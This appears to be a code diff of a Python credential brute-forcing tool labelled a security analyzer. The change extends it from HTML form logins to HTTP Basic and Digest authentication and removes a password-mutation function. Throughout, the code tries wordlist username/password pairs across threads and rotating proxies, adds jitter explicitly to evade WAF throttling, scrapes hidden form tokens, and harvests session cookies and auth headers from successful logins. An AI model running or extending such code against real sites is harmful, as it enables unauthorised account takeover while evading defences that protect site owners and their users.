@@ -41,28 +41,6 @@ def load_wordlist(filepath):
     with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
         return [line.strip() for line in f if line.strip() and not line.startswith('#')]
 
-def mutate_passwords(passwords):
-    """Intelligent mutation engine to expand a seed password list."""
-    mutated = set()
-    suffixes = ["", "123", "1234", "12345", "2025", "2026", "!", "123!", "@", "#"]
-    
-    for pwd in passwords:
-        mutated.add(pwd)
-        mutated.add(pwd.capitalize())
-        mutated.add(pwd.upper())
-        
-        leet = pwd.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
-        mutated.add(leet)
-        mutated.add(leet.capitalize())
-        
-        for suffix in suffixes:
-            if suffix:
-                mutated.add(f"{pwd}{suffix}")
-                mutated.add(f"{pwd.capitalize()}{suffix}")
-                mutated.add(f"{leet}{suffix}")
-                
-    return list(mutated)
-
 def apply_jitter(delay):
     """Applies a random jitter delay to mimic human behavior and evade WAF throttling."""
     if delay > 0:
@@ -105,75 +83,85 @@ def parse_cookies(cookie_arg):
                 cookies[k.strip()] = v.strip()
     return cookies
 
-def test_form_auth(session, target_url, username, password, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, delay=0, lockout_keyword=None, verbose=False):
-    """Tests HTML Form-Based Authentication with session harvesting and response size metrics."""
+def test_auth(session, target_url, username, password, auth_type, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, delay=0, lockout_keyword=None, verbose=False):
+    """Handles testing for HTML Form, HTTP Basic, and HTTP Digest authentication."""
     headers = base_headers.copy()
-    if "Content-Type" not in headers:
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
-
     apply_jitter(delay)
+
+    start_time = time.time()
+    resp = None
+    is_success = False
+
     try:
-        get_resp = session.get(target_url, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
-        
-        hidden_inputs = {}
-        if get_resp.status_code == 200:
-            matches = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', get_resp.text, re.IGNORECASE)
-            for m in matches:
-                name_match = re.search(r'name=["\']?([^"\']+)["\']?', m, re.IGNORECASE)
-                val_match = re.search(r'value=["\']?([^"\']*)["\']?', m, re.IGNORECASE)
-                if name_match:
-                    name = name_match.group(1)
-                    val = val_match.group(1) if val_match else ""
-                    hidden_inputs[name] = val
+        if auth_type == "form":
+            if "Content-Type" not in headers:
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+            
+            get_resp = session.get(target_url, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
+            
+            hidden_inputs = {}
+            if get_resp.status_code == 200:
+                matches = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', get_resp.text, re.IGNORECASE)
+                for m in matches:
+                    name_match = re.search(r'name=["\']?([^"\']+)["\']?', m, re.IGNORECASE)
+                    val_match = re.search(r'value=["\']?([^"\']*)["\']?', m, re.IGNORECASE)
+                    if name_match:
+                        name = name_match.group(1)
+                        val = val_match.group(1) if val_match else ""
+                        hidden_inputs[name] = val
 
-        payload = {
-            user_field: username,
-            pass_field: password,
-            **hidden_inputs
-        }
+            payload = {
+                user_field: username,
+                pass_field: password,
+                **hidden_inputs
+            }
 
-        apply_jitter(delay)
-        
-        start_time = time.time()
-        resp = session.post(
-            target_url,
-            data=payload,
-            headers=headers,
-            cookies=cookies,
-            proxies=req_proxies,
-            timeout=5,
-            allow_redirects=True,
-            verify=False
-        )
-        elapsed = time.time() - start_time
-        resp_length = len(resp.content)
+            apply_jitter(delay)
+            resp = session.post(
+                target_url, data=payload, headers=headers, cookies=cookies,
+                proxies=req_proxies, timeout=5, allow_redirects=True, verify=False
+            )
 
-        if check_lockout(resp.text, resp.status_code, lockout_keyword):
-            print(f"[!] [LOCKOUT/WAF WARNING] Account lockout or rate-limit triggered for user '{username}' at {target_url} (Status: {resp.status_code})")
-
-        is_success = False
-        if resp.status_code in [200, 302, 303]:
-            body_text = resp.text
-            if success_regex:
-                if re.search(success_regex, body_text):
+            if resp.status_code in [200, 302, 303]:
+                body_text = resp.text
+                if success_regex and re.search(success_regex, body_text):
                     is_success = True
-            elif failure_keyword and failure_keyword.lower() not in body_text.lower():
-                is_success = True
-            elif not failure_keyword and resp.status_code == 302:
-                is_success = True
+                elif failure_keyword and failure_keyword.lower() not in body_text.lower():
+                    is_success = True
+                elif not failure_keyword and resp.status_code == 302:
+                    is_success = True
 
-        # Harvest cookies and headers from response session state
-        captured_cookies = {c.name: c.value for c in resp.cookies}
-        captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()}
+        elif auth_type == "basic":
+            auth = HTTPBasicAuth(username, password)
+            resp = session.get(target_url, auth=auth, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, verify=False)
+            if resp.status_code == 200:
+                if not success_regex or re.search(success_regex, resp.text):
+                    is_success = True
+
+        elif auth_type == "digest":
+            auth = HTTPDigestAuth(username, password)
+            resp = session.get(target_url, auth=auth, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, verify=False)
+            if resp.status_code == 200:
+                if not success_regex or re.search(success_regex, resp.text):
+                    is_success = True
+
+        elapsed = time.time() - start_time
+        resp_length = len(resp.content) if resp else 0
+        status_code = resp.status_code if resp else 0
+
+        if resp and check_lockout(resp.text, status_code, lockout_keyword):
+            print(f"[!] [LOCKOUT/WAF WARNING] Rate-limit triggered for user '{username}' at {target_url} (Status: {status_code})")
+
+        captured_cookies = {c.name: c.value for c in resp.cookies} if resp else {}
+        captured_headers = {k: v for k, v in resp.headers.items() if 'auth' in k.lower() or 'token' in k.lower() or 'set-cookie' in k.lower()} if resp else {}
 
         result = {
             "username": username,
             "password": password,
             "endpoint": target_url,
-            "type": "form",
-            "status_code": resp.status_code,
+            "type": auth_type,
+            "status_code": status_code,
             "response_time": elapsed,
             "response_length": resp_length,
             "success": is_success,
@@ -182,13 +170,13 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
         }
 
         if is_success:
-            print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url}")
+            print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url} [{auth_type.upper()}]")
             if captured_cookies:
                 print(f"    [+] Harvested Cookies: {captured_cookies}")
             if captured_headers:
                 print(f"    [+] Harvested Auth Headers: {captured_headers}\n")
         elif verbose:
-            print(f"[-] Failed form login {username}:{password} at {target_url} (Status: {resp.status_code}, Length: {resp_length}B)")
+            print(f"[-] Failed {auth_type} login {username}:{password} at {target_url} (Status: {status_code}, Length: {resp_length}B)")
 
         return result
 
@@ -276,13 +264,14 @@ def export_html_report(findings, timing_vulns, length_outliers, report_path, met
             <td><code>{item['username']}</code></td>
             <td><code>{item['password']}</code></td>
             <td><a href="{item['endpoint']}" target="_blank">{item['endpoint']}</a></td>
+            <td><code>{item['type'].upper()}</code></td>
             <td><code>{cookies_str if cookies_str else 'N/A'}</code></td>
             <td><code>{item['status_code']}</code></td>
         </tr>
         """
 
     if not rows_html:
-        rows_html = '<tr><td colspan="5" class="no-findings">No valid credentials discovered during this scan.</td></tr>'
+        rows_html = '<tr><td colspan="6" class="no-findings">No valid credentials discovered during this scan.</td></tr>'
 
     timing_html = ""
     if timing_vulns:
@@ -455,7 +444,8 @@ def export_html_report(findings, timing_vulns, length_outliers, report_path, met
                     <th>Username</th>
                     <th>Password</th>
                     <th>Endpoint</th>
-                    <th>Harvested Session Cookies</th>
+                    <th>Protocol</th>
+                    <th>Harvested Cookies / Tokens</th>
                     <th>Status</th>
                 </tr>
             </thead>
@@ -512,7 +502,7 @@ def run_analysis(args):
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         futures = [
             executor.submit(
-                test_form_auth, session, args.url, user, pwd, 
+                test_auth, session, args.url, user, pwd, args.auth_type,
                 args.user_field, args.pass_field, args.failure_keyword, 
                 args.success_regex, proxy_pool, args.proxy, base_headers, 
                 cookies, args.delay, args.lockout_keyword, args.verbose
@@ -546,9 +536,9 @@ def run_analysis(args):
     return valid_credentials, timing_vulns, length_outliers
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Session Persistence")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with Multi-Protocol Authentication")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("--auth-type", choices=["form"], default="form", help="Authentication type to test")
+    parser.add_argument("--auth-type", choices=["form", "basic", "digest"], default="form", help="Authentication type to test")
     parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
     parser.add_argument("--passwords", default="passwords.txt", help="Path to passwords wordlist")
     parser.add_argument("--user-field", default="username", help="Form field name for username")
